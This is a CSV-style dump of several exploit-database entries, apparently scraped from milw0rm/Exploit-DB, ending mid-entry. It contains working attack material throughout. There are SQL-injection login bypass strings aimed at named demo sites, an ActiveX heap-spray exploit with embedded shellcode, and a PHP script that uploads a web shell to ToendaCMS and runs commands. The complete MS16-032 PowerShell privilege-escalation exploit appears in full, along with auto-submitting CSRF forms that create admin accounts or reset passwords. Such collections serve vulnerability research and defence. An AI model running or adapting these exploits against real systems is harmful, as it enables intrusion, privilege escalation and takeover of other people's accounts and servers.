8935,Zip Store Chat 4.0/5.0 - Authentication Bypass         \\\|///       \\  - -  //        (  @ @ ) ----oOOo--(_)-oOOo--------------------------- @~~=Author   : ByALBAYX  @~~=Website  : WWW.C4TEAM.ORG ---------------Ooooo-------------------------                (   )       ooooO     ) /       (   )    (_/        \ (         \_) @~~=======================================~~@ @~~=Script   : Zip Store Chat 4.0 + 5.0  @~~=S.Site   : http://zipstore.com.br @~~=======================================~~@  @~~=Vul  @~~=http://c4team.org/ [Yol] /admin/index.asp  Login: ' or '  Senha: ' or '  @~~=Demo    :   @~~=http://zipstore.com.br/chat/4.0/admin/index.asp  @~~=http://zipstore.com.br/chat/5.0/admin/index.asp @~~=======================================~~@  @~~=:/  # milw0rm.com [2009-06-12],Zip,1
15733,"Crystal Reports Viewer 12.0.0.549 - 'PrintControl.dll' ActiveX <!-- Crystal Reports Viewer 12.0.0.549 Activex Exploit (PrintControl.dll) 0-day By = Dr_IDE File = ""C:\Program Files\BusinessObjects\Common\4.0\crystalreportviewers12\ActiveXControls\PrintControl.dll"" method = ""ServerResourceVersion"" progid = ""CrystalPrintControlLib.CrystalPrintControl"" Site = http://www.sap.com Tested On = Windows XPSP3 VM with IE 7.0.5730.13 Notes = In my testing it was not 100% reliable. -->   <html> <object id='target' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object> <script> //payload is windows/exec cmd=calc.exe shellcode = unescape( '%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395'+ '%ufceb%uf4e2%uaec1%u951a%u463d%ud0d5%ucd01%u9022%u4745%u1eb1'+ '%u5e72%ucad5%u471d%udcb5%u72b6%u94d5%u77d3%u0c9e%uc291%ue19e'+ '%u873a%u9894%u843c%u61b5%u1206%u917a%ua348%ucad5%u4719%uf3b5'+ '%u4ab6%u1e15%u5a62%u7e5f%u5ab6%u94d5%ucfd6%ub102%u8539%u556f'+ '%ucd59%ua51e%u86b8%u9926%u06b6%u1e52%u5a4d%u1ef3%u4e55%u9cb5'+ '%uc6b6%u95ee%u463d%ufdd5%u1901%u636f%u105d%u6dd7%u86be%uc525'+ '%u3855%u7786%u2e4e%u6bc6%u48b7%u6a09%u25da%uf93f%u465e%u955e');  nops=unescape('%u9090%u9090'); headersize = 20; slackspace= headersize + shellcode.length;  while(nops.length < slackspace) nops+= nops; fillblock= nops.substring(0, slackspace); block= nops.substring(0, nops.length- slackspace); while( block.length+ slackspace<0x40000) block= block+ block+fillblock; memory=new Array(); for( counter=0; counter<300; counter++) memory[counter]= block +shellcode; ret=''; for( counter=0; counter<=2000; counter++) ret+=unescape('%u0A0A%u0A0A');  target.ServerResourceVersion = ret; </script> </html>",businessobjects,1
2035,"ToendaCMS 1.0.0 - 'FCKeditor' Arbitrary File Upload #!/usr/bin/php -q -d short_open_tag=on <? echo ""ToendaCMS <= 1.0.0 Shizouka stable 'F(u)CKeditor' remote commands execution\n""; echo ""by rgod rgod@autistici.org\n""; echo ""site: http://retrogod.altervista.org\n""; echo ""dork: \""toendaCMS is Free Software released under the GNU/GPL License.\"" | \""powered by toendaCMS\"" -inurl:demo\n\n"";  //works regardless of any php.ini settings,   if ($argc<4) { echo ""Usage: php "".$argv[0]."" host path cmd OPTIONS\n""; echo ""host:      target server (ip/hostname)\n""; echo ""path:      path to toendacms\n""; echo ""cmd:       a shell command\n""; echo ""Options:\n""; echo ""   -p[port]:    specify a port other than 80\n""; echo ""   -P[ip:port]: specify a proxy\n""; echo ""Example:\n""; echo ""php "".$argv[0]."" localhost /cms/ ls -la\n""; die; } error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpacketii($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock);   #debug   #echo ""\r\n"".$html; }  $host=$argv[1]; $path=$argv[2]; $port=80; $proxy=""""; $cmd=""""; for ($i=3; $i<=$argc-1; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if (($temp<>""-p"") and ($temp<>""-P"")) {$cmd.="" "".$argv[$i];} if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } }  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;} if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}  $shell=""<?php echo chr(72).\""i Master!\"";if(get_magic_quotes_gpc()){\$_COOKIE[\""cmd\""]=stripslashes(\$_COOKIE[\""cmd\""]);}""; $shell.=""ini_set(\""max_execution_time\"",0);error_reporting(0);""; $shell.=""echo \""*delim*\"";passthru(\$_COOKIE[\""cmd\""]);?>""; $allowed_extensions = array(""zip"",""doc"",""xls"",""pdf"",""rtf"",""csv"",""jpg"",""gif"",""jpeg"",""png"",""avi"",""mpg"",""mpeg"",""swf"",""fla""); for ($i=0; $i<=count($allowed_extensions)-1; $i++){ $filename=""suntzu.php."".$allowed_extensions[$i]; $data=""-----------------------------7d529a1d23092a\r\n""; $data.=""Content-Disposition: form-data; name=\""NewFile\""; filename=\""$filename\""\r\n""; $data.=""Content-Type:\r\n\r\n""; $data.=""$shell\r\n""; $data.=""-----------------------------7d529a1d23092a--\r\n""; $packet=""POST "".$p.""engine/js/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=%2f HTTP/1.0\r\n""; $packet.=""Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacketii($packet); //echo $html; $packet=""GET "".$p.""data/images/File/"".$filename."" HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Cookie: cmd="".$cmd.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet); //echo $html; if (eregi(""Hi Master!"",$html)){ $temp=explode(""*delim*"",$html); die($temp[1]);} } //if you are here... echo ""Exploit failed...""; ?>  # milw0rm.com [2006-07-18]",toendaCMS\,1
39719,"Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) - Local Privilege Escalation (MS16-032) (PowerShell) function Invoke-MS16-032 { <# .SYNOPSIS          PowerShell implementation of MS16-032. The exploit targets all vulnerable     operating systems that support PowerShell v2+. Credit for the discovery of     the bug and the logic to exploit it go to James Forshaw (@tiraniddo).          Targets:          * Win7-Win10 & 2k8-2k12 <== 32/64 bit!     * Tested on x32 Win7, x64 Win8, x64 2k12R2          Notes:          * In order for the race condition to succeed the machine must have 2+ CPU       cores. If testing in a VM just make sure to add a core if needed mkay.     * Want to know more about MS16-032 ==>       https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html  .DESCRIPTION 	Author: Ruben Boonen (@FuzzySec) 	Blog: http://www.fuzzysecurity.com/ 	License: BSD 3-Clause 	Required Dependencies: PowerShell v2+ 	Optional Dependencies: None      .EXAMPLE 	C:\PS> Invoke-MS16-032 #> 	Add-Type -TypeDefinition @"" 	using System; 	using System.Diagnostics; 	using System.Runtime.InteropServices; 	using System.Security.Principal; 	 	[StructLayout(LayoutKind.Sequential)] 	public struct PROCESS_INFORMATION 	{ 		public IntPtr hProcess; 		public IntPtr hThread; 		public int dwProcessId; 		public int dwThreadId; 	} 	 	[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)] 	public struct STARTUPINFO 	{ 		public Int32 cb; 		public string lpReserved; 		public string lpDesktop; 		public string lpTitle; 		public Int32 dwX; 		public Int32 dwY; 		public Int32 dwXSize; 		public Int32 dwYSize; 		public Int32 dwXCountChars; 		public Int32 dwYCountChars; 		public Int32 dwFillAttribute; 		public Int32 dwFlags; 		public Int16 wShowWindow; 		public Int16 cbReserved2; 		public IntPtr lpReserved2; 		public IntPtr hStdInput; 		public IntPtr hStdOutput; 		public IntPtr hStdError; 	} 	 	[StructLayout(LayoutKind.Sequential)] 	public struct SQOS 	{ 		public int Length; 		public int ImpersonationLevel; 		public int ContextTrackingMode; 		public bool EffectiveOnly; 	} 	 	public static class Advapi32 	{ 		[DllImport(""advapi32.dll"", SetLastError=true, CharSet=CharSet.Unicode)] 		public static extern bool CreateProcessWithLogonW( 			String userName, 			String domain, 			String password, 			int logonFlags, 			String applicationName, 			String commandLine, 			int creationFlags, 			int environment, 			String currentDirectory, 			ref  STARTUPINFO startupInfo, 			out PROCESS_INFORMATION processInformation); 			 		[DllImport(""advapi32.dll"", SetLastError=true)] 		public static extern bool SetThreadToken( 			ref IntPtr Thread, 			IntPtr Token); 			 		[DllImport(""advapi32.dll"", SetLastError=true)] 		public static extern bool OpenThreadToken( 			IntPtr ThreadHandle, 			int DesiredAccess, 			bool OpenAsSelf, 			out IntPtr TokenHandle); 			 		[DllImport(""advapi32.dll"", SetLastError=true)] 		public static extern bool OpenProcessToken( 			IntPtr ProcessHandle,  			int DesiredAccess, 			ref IntPtr TokenHandle); 			 		[DllImport(""advapi32.dll"", SetLastError=true)] 		public extern static bool DuplicateToken( 			IntPtr ExistingTokenHandle, 			int SECURITY_IMPERSONATION_LEVEL, 			ref IntPtr DuplicateTokenHandle); 	} 	 	public static class Kernel32 	{ 		[DllImport(""kernel32.dll"")] 		public static extern uint GetLastError(); 	 		[DllImport(""kernel32.dll"", SetLastError=true)] 		public static extern IntPtr GetCurrentProcess(); 	 		[DllImport(""kernel32.dll"", SetLastError=true)] 		public static extern IntPtr GetCurrentThread(); 		 		[DllImport(""kernel32.dll"", SetLastError=true)] 		public static extern int GetThreadId(IntPtr hThread); 		 		[DllImport(""kernel32.dll"", SetLastError = true)] 		public static extern int GetProcessIdOfThread(IntPtr handle); 		 		[DllImport(""kernel32.dll"",SetLastError=true)] 		public static extern int SuspendThread(IntPtr hThread); 		 		[DllImport(""kernel32.dll"",SetLastError=true)] 		public static extern int ResumeThread(IntPtr hThread); 		 		[DllImport(""kernel32.dll"", SetLastError=true)] 		public static extern bool TerminateProcess( 			IntPtr hProcess, 			uint uExitCode); 	 		[DllImport(""kernel32.dll"", SetLastError=true)] 		public static extern bool CloseHandle(IntPtr hObject); 		 		[DllImport(""kernel32.dll"", SetLastError=true)] 		public static extern bool DuplicateHandle( 			IntPtr hSourceProcessHandle, 			IntPtr hSourceHandle, 			IntPtr hTargetProcessHandle, 			ref IntPtr lpTargetHandle, 			int dwDesiredAccess, 			bool bInheritHandle, 			int dwOptions); 	} 	 	public static class Ntdll 	{ 		[DllImport(""ntdll.dll"", SetLastError=true)] 		public static extern int NtImpersonateThread( 			IntPtr ThreadHandle, 			IntPtr ThreadToImpersonate, 			ref SQOS SecurityQualityOfService); 	} ""@ 	 	function Get-ThreadHandle { 		# StartupInfo Struct 		$StartupInfo = New-Object STARTUPINFO 		$StartupInfo.dwFlags = 0x00000100 # STARTF_USESTDHANDLES 		$StartupInfo.hStdInput = [Kernel32]::GetCurrentThread() 		$StartupInfo.hStdOutput = [Kernel32]::GetCurrentThread() 		$StartupInfo.hStdError = [Kernel32]::GetCurrentThread() 		$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size 		 		# ProcessInfo Struct 		$ProcessInfo = New-Object PROCESS_INFORMATION 		 		# CreateProcessWithLogonW --> lpCurrentDirectory 		$GetCurrentPath = (Get-Item -Path "".\"" -Verbose).FullName 		 		# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED 		$CallResult = [Advapi32]::CreateProcessWithLogonW( 			""user"", ""domain"", ""pass"", 			0x00000002, ""C:\Windows\System32\cmd.exe"", """", 			0x00000004, $null, $GetCurrentPath, 			[ref]$StartupInfo, [ref]$ProcessInfo) 		 		# Duplicate handle into current process -> DUPLICATE_SAME_ACCESS 		$lpTargetHandle = [IntPtr]::Zero 		$CallResult = [Kernel32]::DuplicateHandle( 			$ProcessInfo.hProcess, 0x4, 			[Kernel32]::GetCurrentProcess(), 			[ref]$lpTargetHandle, 0, $false, 			0x00000002) 		 		# Clean up suspended process 		$CallResult = [Kernel32]::TerminateProcess($ProcessInfo.hProcess, 1) 		$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hProcess) 		$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hThread) 		 		$lpTargetHandle 	} 	 	function Get-SystemToken { 		echo ""`n[?] Thread belongs to: $($(Get-Process -PID $([Kernel32]::GetProcessIdOfThread($hThread))).ProcessName)"" 	 		$CallResult = [Kernel32]::SuspendThread($hThread) 		if ($CallResult -ne 0) { 			echo ""[!] $hThread is a bad thread, exiting.."" 			Return 		} echo ""[+] Thread suspended"" 		 		echo ""[>] Wiping current impersonation token"" 		$CallResult = [Advapi32]::SetThreadToken([ref]$hThread, [IntPtr]::Zero) 		if (!$CallResult) { 			echo ""[!] SetThreadToken failed, exiting.."" 			$CallResult = [Kernel32]::ResumeThread($hThread) 			echo ""[+] Thread resumed!"" 			Return 		} 		 		echo ""[>] Building SYSTEM impersonation token"" 		# SecurityQualityOfService struct 		$SQOS = New-Object SQOS 		$SQOS.ImpersonationLevel = 2 #SecurityImpersonation 		$SQOS.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SQOS) 		# Undocumented API's, I like your style Microsoft ;) 		$CallResult = [Ntdll]::NtImpersonateThread($hThread, $hThread, [ref]$sqos) 		if ($CallResult -ne 0) { 			echo ""[!] NtImpersonateThread failed, exiting.."" 			$CallResult = [Kernel32]::ResumeThread($hThread) 			echo ""[+] Thread resumed!"" 			Return 		} 		 		# Null $SysTokenHandle 		$script:SysTokenHandle = [IntPtr]::Zero  		# 0x0006 --> TOKEN_DUPLICATE -bor TOKEN_IMPERSONATE 		$CallResult = [Advapi32]::OpenThreadToken($hThread, 0x0006, $false, [ref]$SysTokenHandle) 		if (!$CallResult) { 			echo ""[!] OpenThreadToken failed, exiting.."" 			$CallResult = [Kernel32]::ResumeThread($hThread) 			echo ""[+] Thread resumed!"" 			Return 		} 		 		echo ""[?] Success, open SYSTEM token handle: $SysTokenHandle"" 		echo ""[+] Resuming thread.."" 		$CallResult = [Kernel32]::ResumeThread($hThread) 	} 	 	# main() <--- ;) 	$ms16032 = @"" 	 __ __ ___ ___   ___     ___ ___ ___  	|  V  |  _|_  | |  _|___|   |_  |_  | 	|     |_  |_| |_| . |___| | |_  |  _| 	|_|_|_|___|_____|___|   |___|___|___| 	                                     	               [by b33f -> @FuzzySec] ""@ 	 	$ms16032 	 	# Check logical processor count, race condition requires 2+ 	echo ""`n[?] Operating system core count: $([System.Environment]::ProcessorCount)"" 	if ($([System.Environment]::ProcessorCount) -lt 2) { 		echo ""[!] This is a VM isn't it, race condition requires at least 2 CPU cores, exiting!`n"" 		Return 	} 	 	echo ""[>] Duplicating CreateProcessWithLogonW handle"" 	$hThread = Get-ThreadHandle 	 	# If no thread handle is captured, the box is patched 	if ($hThread -eq 0) { 		echo ""[!] No valid thread handle was captured, exiting!`n"" 		Return 	} else { 		echo ""[?] Done, using thread handle: $hThread"" 	} echo ""`n[*] Sniffing out privileged impersonation token.."" 	 	# Get handle to SYSTEM access token 	Get-SystemToken 	 	# If we fail a check in Get-SystemToken, exit 	if ($SysTokenHandle -eq 0) { 		Return 	} 	 	echo ""`n[*] Sniffing out SYSTEM shell.."" 	echo ""`n[>] Duplicating SYSTEM token"" 	$hDuplicateTokenHandle = [IntPtr]::Zero 	$CallResult = [Advapi32]::DuplicateToken($SysTokenHandle, 2, [ref]$hDuplicateTokenHandle) 	 	# Simple PS runspace definition 	echo ""[>] Starting token race"" 	$Runspace = [runspacefactory]::CreateRunspace() 	$StartTokenRace = [powershell]::Create() 	$StartTokenRace.runspace = $Runspace 	$Runspace.Open() 	[void]$StartTokenRace.AddScript({ 		Param ($hThread, $hDuplicateTokenHandle) 		while ($true) { 			$CallResult = [Advapi32]::SetThreadToken([ref]$hThread, $hDuplicateTokenHandle) 		} 	}).AddArgument($hThread).AddArgument($hDuplicateTokenHandle) 	$AscObj = $StartTokenRace.BeginInvoke() 	 	echo ""[>] Starting process race"" 	# Adding a timeout (10 seconds) here to safeguard from edge-cases 	$SafeGuard = [diagnostics.stopwatch]::StartNew() 	while ($SafeGuard.ElapsedMilliseconds -lt 10000) {  		# StartupInfo Struct 		$StartupInfo = New-Object STARTUPINFO 		$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size 		 		# ProcessInfo Struct 		$ProcessInfo = New-Object PROCESS_INFORMATION 		 		# CreateProcessWithLogonW --> lpCurrentDirectory 		$GetCurrentPath = (Get-Item -Path "".\"" -Verbose).FullName 		 		# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED 		$CallResult = [Advapi32]::CreateProcessWithLogonW( 			""user"", ""domain"", ""pass"", 			0x00000002, ""C:\Windows\System32\cmd.exe"", """", 			0x00000004, $null, $GetCurrentPath, 			[ref]$StartupInfo, [ref]$ProcessInfo) 		 		#--- 		# Make sure CreateProcessWithLogonW ran successfully! If not, skip loop. 		#--- 		# Missing this check used to cause the exploit to fail sometimes. 		# If CreateProcessWithLogon fails OpenProcessToken won't succeed 		# but we obviously don't have a SYSTEM shell :'( . Should be 100% 		# reliable now! 		#--- 		if (!$CallResult) { 			continue 		} 			 		$hTokenHandle = [IntPtr]::Zero 		$CallResult = [Advapi32]::OpenProcessToken($ProcessInfo.hProcess, 0x28, [ref]$hTokenHandle) 		# If we can't open the process token it's a SYSTEM shell! 		if (!$CallResult) { 			echo ""[!] Holy handle leak Batman, we have a SYSTEM shell!!`n"" 			$CallResult = [Kernel32]::ResumeThread($ProcessInfo.hThread) 			$StartTokenRace.Stop() 			$SafeGuard.Stop() 			Return 		} 			 		# Clean up suspended process 		$CallResult = [Kernel32]::TerminateProcess($ProcessInfo.hProcess, 1) 		$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hProcess) 		$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hThread)  	} 	 	# Kill runspace & stopwatch if edge-case 	$StartTokenRace.Stop() 	$SafeGuard.Stop() }",Microsoft,1
7360,"ASP AutoDealer - Remote Database Disclosure [~] ASPAutoDealer DD Remote Vuln. [~] [~] ---------------------------------------------------------- [~] Discovered By: ZoRLu   msn: trt-turk@hotmail.com [~] [~] Home: www.z0rlu.blogspot.com [~] [~] N0T: YALNIZLIK, YiTiRDi ANLAMINI YALNIZLIGIMDA : ( ( [~] -----------------------------------------------------------  exp for demo: ( DD )  http://demo.merlix.com/autodealer/auto.mdb  [~]---------------------------------------------------------------------- [~] Greetz tO: str0ke  [~] [~] yildirimordulari.org  &  darkc0de.com [~] [~]----------------------------------------------------------------------  note: DD First submission /str0ke  # milw0rm.com [2008-12-06]",.z0rlu.blogspot.,0
8774,"Mole Group Sky Hunter/Bus Ticket Scripts - Change Admin Password <html> <head> <!--  ==============================================================================                       _      _       _          _      _   _                       / \    | |     | |        / \    | | | |                     / _ \   | |     | |       / _ \   | |_| |                    / ___ \  | |___  | |___   / ___ \  |  _  |    IN THE NAME OF /_/   \_\ |_____| |_____| /_/   \_\ |_| |_|                                                                ==============================================================================                       ____   _  _     _   _    ___    _  __                      / ___| | || |   | \ | |  / _ \  | |/ /                     | |  _  | || |_  |  \| | | | | | | ' /                      | |_| | |__   _| | |\  | | |_| | | . \                       \____|    |_|   |_| \_|  \___/  |_|\_\...FROM IRAN  ============================================================================== 	Mole Group Sky Hunter/Bus Ticket Scripts Change Admin Pass Exploit ==============================================================================  	[Â»] Script:.............[ Mole Group Sky Hunter/Bus Ticket Scripts ].. 	[Â»] Website:............[ http://www.mole-group.com ]................. 	[Â»] Today:..............[ 2205009 ]................................... 	[Â»] Founder:............[ G4N0K | mail[.]ganok[sh!t]gmail.com ].......   	 	 [+] Vulnerable Scripts 	===============================        [0] Sky Hunter Script (demo: http://sky.mole-group.com/admin/admin.php)        [1] Bus Ticket Script (demo: http://bus.mole-group.com/admin/admin.php)    	 [+] Greetz 	===================================        [Â»] ALLAH        [Â»] MSD, AMD, AFN, SMN, Str0ke...        [Â»] Hussain-X, JiKo, Sakab(!)...  --> <title>Mole Group Sky Hunter/Bus Ticket Scripts Change Admin Pass Exploit | G4N0K</title>  </head> <body>   <h3>::Change Password</h3>  	<table> 		<tr> 			<form method=""post"" action=""http://sky.mole-group.com/admin/admin.php""> 			<input type=""hidden"" name=""user_id"" value=""1""> 			<td align=right>Username:</td> 			<td align=left><input name=""user_name"" size=""40"" maxlength=""40"" value=""admin""><td> 		</tr> 		<tr> 			<td align=right>New Password:</td><td align=left><input name=""password"" size=""40"" maxlength=""40"" ><td> 		</tr> 		<tr> 			<td></td><td><input type=""submit"" name=""submit"" value=""Change Password""></td> 			</form> 		</tr> 	</table> </body> </html>  # milw0rm.com [2009-05-22]",.mole-group.,1
38074,"Cerb 7.0.3 - Cross-Site Request Forgery Advisory ID: HTB23269 Product: Cerb Vendor: Webgroup Media LLC Vulnerable Version(s): 7.0.3 and probably prior Tested Version: 7.0.3 Advisory Publication:  August 12, 2015  [without technical details] Vendor Notification: August 12, 2015  Vendor Patch: August 14, 2015  Public Disclosure: September 2, 2015  Vulnerability Type: Cross-Site Request Forgery [CWE-352] CVE Reference: CVE-2015-6545 Risk Level: Medium  CVSSv2 Base Score: 5.1 (AV:N/AC:H/Au:N/C:P/I:P/A:P) Solution Status: Fixed by Vendor Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )   -----------------------------------------------------------------------------------------------  Advisory Details:  High-Tech Bridge Security Research Lab discovered CSRF vulnerability in Cerb platform, which can be exploited to perform Cross-Site Request Forgery attacks against administrators of vulnerable web application to add administrate accounts into the system.    The vulnerability exists due to failure of the ""/ajax.php"" script to properly verify the source of incoming HTTP request. Taking into consideration that Cerb is a business-critical application, this security flaw may be quite dangerous if exploited by malicious attackers.  A simple exploit below will add admin user into the system when a logged-in victim opens a malicious page with the exploit:   <form action=""http://[host]/ajax.php"" method = ""POST""> <input type=""hidden"" name=""c"" value=""config""> <input type=""hidden"" name=""a"" value=""handleSectionAction""> <input type=""hidden"" name=""section"" value=""workers""> <input type=""hidden"" name=""action"" value=""saveWorkerPeek""> <input type=""hidden"" name=""id"" value=""0""> <input type=""hidden"" name=""view_id"" value=""workers_cfg""> <input type=""hidden"" name=""do_delete"" value=""0""> <input type=""hidden"" name=""first_name"" value=""first name""> <input type=""hidden"" name=""last_name"" value=""last name""> <input type=""hidden"" name=""title"" value=""title""> <input type=""hidden"" name=""email"" value=""username@mail.com""> <input type=""hidden"" name=""at_mention_name"" value=""name""> <input type=""hidden"" name=""is_disabled"" value=""0""> <input type=""hidden"" name=""is_superuser"" value=""1""> <input type=""hidden"" name=""lang_code"" value=""en_US""> <input type=""hidden"" name=""timezone"" value=""Antarctica%2FTroll""> <input type=""hidden"" name=""time_format"" value=""D%2C+d+M+Y+h%3Ai+a""> <input type=""hidden"" name=""auth_extension_id"" value=""login.password""> <input type=""hidden"" name=""password_new"" value=""password""> <input type=""hidden"" name=""password_verify"" value=""password""> <input type=""hidden"" name=""calendar_id"" value=""new""> <input value=""submit"" id=""btn"" type=""submit"" /> </form> <script> document.getElementById('btn').click(); </script>     -----------------------------------------------------------------------------------------------  Solution:  Update to Cerb 7.0.4  More Information: https://github.com/wgm/cerb/commit/12de87ff9961a4f3ad2946c8f47dd0c260607144 http://wiki.cerbweb.com/7.0#7.0.4  -----------------------------------------------------------------------------------------------  References:  [1] High-Tech Bridge Advisory HTB23269 - https://www.htbridge.com/advisory/HTB23269 - Cross-Site Request Forgery in Cerb. [2] Cerb - http://www.cerberusweb.com/ - Cerb is a fast and flexible platform for enterprise collaboration, productivity, and automation. [3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures. [4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types. [5] ImmuniWeb® SaaS - https://www.htbridge.com/immuniweb/ - hybrid of manual web application penetration test and cutting-edge vulnerability scanner available online via a Software-as-a-Service (SaaS) model.  -----------------------------------------------------------------------------------------------  Disclaimer: The information provided in this Advisory is provided ""as is"" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.",webgroupmedia,1
40155,"PHP 5.5.37/5.6.23/7.0.8 - 'bzread()' Out-of-Bounds Write ''' PHP 7.0.8, 5.6.23 and 5.5.37 does not perform adequate error handling in its `bzread()' function:  php-7.0.8/ext/bz2/bz2.c ,---- | 364 static PHP_FUNCTION(bzread) | 365 { | ... | 382     ZSTR_LEN(data) = php_stream_read(stream, ZSTR_VAL(data), ZSTR_LEN(data)); | 383     ZSTR_VAL(data)[ZSTR_LEN(data)] = '\0'; | 384 | 385     RETURN_NEW_STR(data); | 386 } `----  php-7.0.8/ext/bz2/bz2.c ,---- | 210 php_stream_ops php_stream_bz2io_ops = { | 211     php_bz2iop_write, php_bz2iop_read, | 212     php_bz2iop_close, php_bz2iop_flush, | 213     ""BZip2"", | 214     NULL, /* seek */ | 215     NULL, /* cast */ | 216     NULL, /* stat */ | 217     NULL  /* set_option */ | 218 }; `----  php-7.0.8/ext/bz2/bz2.c ,---- | 136 /* {{{ BZip2 stream implementation */ | 137 | 138 static size_t php_bz2iop_read(php_stream *stream, char *buf, size_t count) | 139 { | 140     struct php_bz2_stream_data_t *self = (struct php_bz2_stream_data_t *)stream->abstract; | 141     size_t ret = 0; | 142 | 143     do { | 144         int just_read; | ... | 148         just_read = BZ2_bzread(self->bz_file, buf, to_read); | 149 | 150         if (just_read < 1) { | 151             stream->eof = 0 == just_read; | 152             break; | 153         } | 154 | 155         ret += just_read; | 156     } while (ret < count); | 157 | 158     return ret; | 159 } `----  The erroneous return values for Bzip2 are as follows:  bzip2-1.0.6/bzlib.h ,---- | 038 #define BZ_SEQUENCE_ERROR    (-1) | 039 #define BZ_PARAM_ERROR       (-2) | 040 #define BZ_MEM_ERROR         (-3) | 041 #define BZ_DATA_ERROR        (-4) | 042 #define BZ_DATA_ERROR_MAGIC  (-5) | 043 #define BZ_IO_ERROR          (-6) | 044 #define BZ_UNEXPECTED_EOF    (-7) | 045 #define BZ_OUTBUFF_FULL      (-8) | 046 #define BZ_CONFIG_ERROR      (-9) `----  Should the invocation of BZ2_bzread() fail, the loop would simply be broken out of (bz2.c:152) and execution would continue with bzread() returning RETURN_NEW_STR(data).  According to the manual [1], bzread() returns FALSE on error; however that does not seem to ever happen.  Due to the way that the bzip2 library deals with state, this could result in an exploitable condition if a user were to call bzread() after an error, eg:  ,---- | $data = """"; | while (!feof($fp)) { |     $res = bzread($fp); |     if ($res === FALSE) { |         exit(""ERROR: bzread()""); |     } |     $data .= $res; | } `----   Exploitation ============  One way the lack of error-checking could be abused is through out-of-bound writes that may occur when `BZ2_decompress()' (BZ2_bzread() -> BZ2_bzRead() -> BZ2_bzDecompress() -> BZ2_decompress()) processes the `pos' array using user-controlled selectors as indices:  bzip2-1.0.6/decompress.c ,---- | 106 Int32 BZ2_decompress ( DState* s ) | 107 { | 108    UChar      uc; | 109    Int32      retVal; | ... | 113    /* stuff that needs to be saved/restored */ | 114    Int32  i; | 115    Int32  j; | ... | 118    Int32  nGroups; | 119    Int32  nSelectors; | ... | 167    /*restore from the save area*/ | 168    i           = s->save_i; | 169    j           = s->save_j; | ... | 172    nGroups     = s->save_nGroups; | 173    nSelectors  = s->save_nSelectors; | ... | 195    switch (s->state) { | ... | 286       /*--- Now the selectors ---*/ | 287       GET_BITS(BZ_X_SELECTOR_1, nGroups, 3); | 288       if (nGroups < 2 || nGroups > 6) RETURN(BZ_DATA_ERROR); | 289       GET_BITS(BZ_X_SELECTOR_2, nSelectors, 15); | 290       if (nSelectors < 1) RETURN(BZ_DATA_ERROR); | 291       for (i = 0; i < nSelectors; i++) { | 292          j = 0; | 293          while (True) { | 294             GET_BIT(BZ_X_SELECTOR_3, uc); | 295             if (uc == 0) break; | 296             j++; | 297             if (j >= nGroups) RETURN(BZ_DATA_ERROR); | 298          } | 299          s->selectorMtf[i] = j; | 300       } | 301 | 302       /*--- Undo the MTF values for the selectors. ---*/ | 303       { | 304          UChar pos[BZ_N_GROUPS], tmp, v; | 305          for (v = 0; v < nGroups; v++) pos[v] = v; | 306 | 